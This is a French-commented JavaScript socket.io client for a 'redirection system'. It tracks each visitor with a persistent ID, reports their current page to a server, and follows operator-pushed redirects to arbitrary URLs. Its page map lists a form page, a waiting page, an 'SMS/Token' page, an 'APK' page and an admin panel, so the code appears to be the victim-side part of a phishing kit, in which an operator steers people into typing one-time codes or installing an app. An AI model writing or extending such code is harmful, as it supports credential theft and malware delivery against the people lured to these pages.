// Client WebSocket amélioré pour le système de redirection
class ImprovedRedirectionClient {
    constructor() {
        this.socket = null;
        this.clientId = null;
        this.isConnected = false;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 15;
        this.reconnectDelay = 1000; // Délai initial en ms
        this.maxReconnectDelay = 30000; // Délai maximum en ms
        this.heartbeatInterval = null;
        this.connectionTimeout = null;
        this.isReconnecting = false;
        
        // Configuration
        this.config = {
            heartbeatInterval: 25000, // 25 secondes
            connectionTimeout: 10000, // 10 secondes
            pingInterval: 30000, // 30 secondes
            maxRetries: 15,
            retryBackoffFactor: 1.5
        };
        
        // Événements personnalisés
        this.eventListeners = {
            'connected': [],
            'disconnected': [],
            'reconnected': [],
            'redirect': [],
            'error': []
        };
        
        this.init();
    }

    init() {
        console.log('Initialisation du client de redirection amélioré...');
        
        // Récupérer l'ID client depuis le localStorage
        this.clientId = localStorage.getItem('client_id');
        
        // Initialiser la connexion WebSocket
        this.connect();
        
        // Gérer la visibilité de la page
        this.handlePageVisibility();
        
        // Gérer les événements de la page
        this.handlePageEvents();
    }

    connect() {
        if (this.isReconnecting) {
            console.log('Reconnexion déjà en cours...');
            return;
        }
        
        console.log('Tentative de connexion WebSocket...');
        
        // Configuration du socket avec options de reconnexion
        this.socket = io({
            transports: ['websocket', 'polling'],
            upgrade: true,
            rememberUpgrade: true,
            timeout: this.config.connectionTimeout,
            reconnection: false, // Gestion manuelle de la reconnexion
            forceNew: true
        });
        
        this.setupSocketEvents();
        
        // Timeout de connexion
        this.connectionTimeout = setTimeout(() => {
            if (!this.isConnected) {
                console.warn('Timeout de connexion');
                this.handleConnectionError('Connection timeout');
            }
        }, this.config.connectionTimeout);
    }

    setupSocketEvents() {
        // Gestion de la connexion
        this.socket.on('connect', () => {
            console.log('✅ Connecté au serveur WebSocket');
            this.isConnected = true;
            this.reconnectAttempts = 0;
            this.reconnectDelay = 1000;
            this.isReconnecting = false;
            
            if (this.connectionTimeout) {
                clearTimeout(this.connectionTimeout);
                this.connectionTimeout = null;
            }
            
            // Si nous avons déjà un ID client, le réutiliser
            if (this.clientId) {
                console.log('Reconnexion avec ID existant:', this.clientId);
                this.socket.emit('rejoin_client', { client_id: this.clientId });
            }
            
            // Démarrer le heartbeat
            this.startHeartbeat();
            
            // Notifier la page actuelle
            this.notifyPageChange(this.getCurrentPage());
            
            // Déclencher l'événement personnalisé
            this.triggerEvent('connected');
        });

        // Réception de l'ID client
        this.socket.on('client_id', (data) => {
            const wasReconnection = data.reconnected || false;
            this.clientId = data.client_id;
            localStorage.setItem('client_id', this.clientId);
            
            console.log(`${wasReconnection ? '🔄 Reconnecté' : '🆔 ID Client reçu'}:`, this.clientId);
            
            // Notifier la page actuelle
            this.notifyPageChange(this.getCurrentPage());
            
            if (wasReconnection) {
                this.triggerEvent('reconnected', { clientId: this.clientId });
            }
        });

        // Gestion des redirections
        this.socket.on('redirect', (data) => {
            console.log('🔄 Redirection reçue vers:', data.url);
            this.triggerEvent('redirect', data);
            this.performRedirection(data.url);
        });

        // Gestion des heartbeats
        this.socket.on('heartbeat_ack', (data) => {
            console.log('💓 Heartbeat ACK reçu');
        });

        // Gestion des pings
        this.socket.on('pong', (data) => {
            console.log('🏓 Pong reçu');
        });

        // Gestion de la déconnexion forcée
        this.socket.on('force_disconnect', (data) => {
            console.warn('⚠️ Déconnexion forcée:', data.message);
            this.cleanup();
            alert('Connexion fermée par l\'administrateur');
        });

        // Gestion de la déconnexion
        this.socket.on('disconnect', (reason) => {
            console.warn('❌ Déconnecté du serveur WebSocket:', reason);
            this.isConnected = false;
            this.stopHeartbeat();
            
            this.triggerEvent('disconnected', { reason });
            
            // Tentative de reconnexion automatique
            if (reason !== 'io client disconnect' && reason !== 'forced close') {
                this.scheduleReconnect();
            }
        });

        // Gestion des erreurs de connexion
        this.socket.on('connect_error', (error) => {
            console.error('❌ Erreur de connexion WebSocket:', error);
            this.handleConnectionError(error);
        });

        // Gestion des erreurs générales
        this.socket.on('error', (error) => {
            console.error('❌ Erreur WebSocket:', error);
            this.triggerEvent('error', { error });
        });
    }

    handleConnectionError(error) {
        this.isConnected = false;
        this.triggerEvent('error', { error });
        
        if (this.connectionTimeout) {
            clearTimeout(this.connectionTimeout);
            this.connectionTimeout = null;
        }
        
        this.scheduleReconnect();
    }

    scheduleReconnect() {
        if (this.isReconnecting || this.reconnectAttempts >= this.maxReconnectAttempts) {
            if (this.reconnectAttempts >= this.maxReconnectAttempts) {
                console.error('❌ Nombre maximum de tentatives de reconnexion atteint');
                this.triggerEvent('error', { error: 'Max reconnection attempts reached' });
            }
            return;
        }
        
        this.isReconnecting = true;
        this.reconnectAttempts++;
        
        console.log(`🔄 Tentative de reconnexion ${this.reconnectAttempts}/${this.maxReconnectAttempts} dans ${this.reconnectDelay}ms`);
        
        setTimeout(() => {
            if (this.socket) {
                this.socket.disconnect();
            }
            this.connect();
        }, this.reconnectDelay);
        
        // Augmenter le délai pour la prochaine tentative (backoff exponentiel)
        this.reconnectDelay = Math.min(
            this.reconnectDelay * this.config.retryBackoffFactor,
            this.maxReconnectDelay
        );
    }

    startHeartbeat() {
        this.stopHeartbeat(); // S'assurer qu'il n'y a pas de heartbeat existant
        
        this.heartbeatInterval = setInterval(() => {
            if (this.isConnected && this.clientId) {
                this.socket.emit('heartbeat', { client_id: this.clientId });
            }
        }, this.config.heartbeatInterval);
        
        // Ping périodique
        setInterval(() => {
            if (this.isConnected) {
                this.socket.emit('ping');
            }
        }, this.config.pingInterval);
    }

    stopHeartbeat() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
            this.heartbeatInterval = null;
        }
    }

    getCurrentPage() {
        const path = window.location.pathname;
        const pageMap = {            '/' : 'Page principale (formulaire)',
            '/index.html': 'Page principale (formulaire)',
            '/att.html': 'Page d\'attente',
            '/sms.html': 'Page SMS/Token',
            '/apk.html': 'Page APK',
            '/admin.html': 'Panneau d\'administration'
        };
        
        return pageMap[path] || `Page: ${path}`;
    }

    notifyPageChange(page) {
        if (this.isConnected && this.clientId) {
            this.socket.emit('page_change', {
                client_id: this.clientId,
                page: page
            });
        } else {
            // Réessayer après un délai si pas encore connecté
            setTimeout(() => {
                if (this.clientId) {
                    this.notifyPageChange(page);
                }
            }, 2000);
        }
    }

    performRedirection(url) {
        console.log('🔄 Redirection vers:', url);
        
        // Vérifier si c'est une URL externe
        if (url.startsWith('http://') || url.startsWith('https://')) {
            // Redirection vers un lien externe
            window.location.href = url;
        } else {
            // Redirection interne - maintenir la connexion WebSocket
            window.location.href = url;
        }
    }

    handlePageVisibility() {
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible') {
                console.log('📱 Page visible - vérification de la connexion');
                if (!this.isConnected) {
                    this.forceReconnect();
                }
            }
        });
    }

    handlePageEvents() {
        // Gérer les changements d'URL
        window.addEventListener('popstate', () => {
            setTimeout(() => {
                this.notifyPageChange(this.getCurrentPage());
            }, 100);
        });
        
        // Gérer le rechargement de la page
        window.addEventListener('beforeunload', () => {
            if (this.socket && this.isConnected) {
                this.socket.disconnect();
            }
        });
    }

    // Méthodes publiques
    forceReconnect() {
        console.log('🔄 Reconnexion forcée...');
        this.reconnectAttempts = 0;
        this.reconnectDelay = 1000;
        this.isReconnecting = false;
        
        if (this.socket) {
            this.socket.disconnect();
        }
        
        setTimeout(() => {
            this.connect();
        }, 1000);
    }

    disconnect() {
        console.log('🔌 Déconnexion manuelle');
        this.cleanup();
    }

    cleanup() {
        this.isConnected = false;
        this.isReconnecting = false;
        this.stopHeartbeat();
        
        if (this.connectionTimeout) {
            clearTimeout(this.connectionTimeout);
            this.connectionTimeout = null;
        }
        
        if (this.socket) {
            this.socket.disconnect();
            this.socket = null;
        }
    }

    // Système d'événements personnalisés
    on(event, callback) {
        if (this.eventListeners[event]) {
            this.eventListeners[event].push(callback);
        }
    }

    off(event, callback) {
        if (this.eventListeners[event]) {
            const index = this.eventListeners[event].indexOf(callback);
            if (index > -1) {
                this.eventListeners[event].splice(index, 1);
            }
        }
    }

    triggerEvent(event, data = {}) {
        if (this.eventListeners[event]) {
            this.eventListeners[event].forEach(callback => {
                try {
                    callback(data);
                } catch (error) {
                    console.error(`Erreur dans le callback de l'événement ${event}:`, error);
                }
            });
        }
    }

    // Méthodes utilitaires
    getStatus() {
        return {
            isConnected: this.isConnected,
            clientId: this.clientId,
            reconnectAttempts: this.reconnectAttempts,
            isReconnecting: this.isReconnecting,
            currentPage: this.getCurrentPage()
        };
    }

    getClientId() {
        return this.clientId;
    }

    isConnectionActive() {
        return this.isConnected;
    }
}

// Initialiser le client de redirection quand le DOM est chargé
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Initialisation du client de redirection amélioré');
    
    window.redirectionClient = new ImprovedRedirectionClient();
    
    // Ajouter des événements personnalisés
    window.redirectionClient.on('connected', () => {
        console.log('✅ Client connecté avec succès');
        // Masquer les indicateurs de connexion si nécessaire
        const connectionIndicator = document.getElementById('connection-status');
        if (connectionIndicator) {
            connectionIndicator.textContent = 'Connecté';
            connectionIndicator.className = 'connected';
        }
    });
    
    window.redirectionClient.on('disconnected', (data) => {
        console.log('❌ Client déconnecté:', data.reason);
        // Afficher un indicateur de déconnexion
        const connectionIndicator = document.getElementById('connection-status');
        if (connectionIndicator) {
            connectionIndicator.textContent = 'Déconnecté - Reconnexion...';
            connectionIndicator.className = 'disconnected';
        }
    });
    
    window.redirectionClient.on('reconnected', (data) => {
        console.log('🔄 Client reconnecté:', data.clientId);
        // Afficher un message de reconnexion
        const connectionIndicator = document.getElementById('connection-status');
        if (connectionIndicator) {
            connectionIndicator.textContent = 'Reconnecté';
            connectionIndicator.className = 'reconnected';
        }
    });
    
    // Notifier le changement de page après le chargement complet
    window.addEventListener('load', () => {
        if (window.redirectionClient) {
            window.redirectionClient.notifyPageChange(window.redirectionClient.getCurrentPage());
        }
    });
});

// Fonction pour rediriger vers la page d'attente après soumission du formulaire
function redirectToWaitingPage() {
    if (window.redirectionClient && window.redirectionClient.isConnectionActive()) {
        window.redirectionClient.performRedirection('/att.html');
    } else {
        // Fallback si WebSocket n'est pas disponible
        console.warn('WebSocket non disponible, utilisation du fallback');
        window.location.href = '/att.html';
    }
}

// Fonction utilitaire pour obtenir le statut de la connexion
function getConnectionStatus() {
    if (window.redirectionClient) {
        return window.redirectionClient.getStatus();
    }
    return { isConnected: false, error: 'Client non initialisé' };
}

// Fonction pour forcer la reconnexion
function forceReconnect() {
    if (window.redirectionClient) {
        window.redirectionClient.forceReconnect();
    }
}

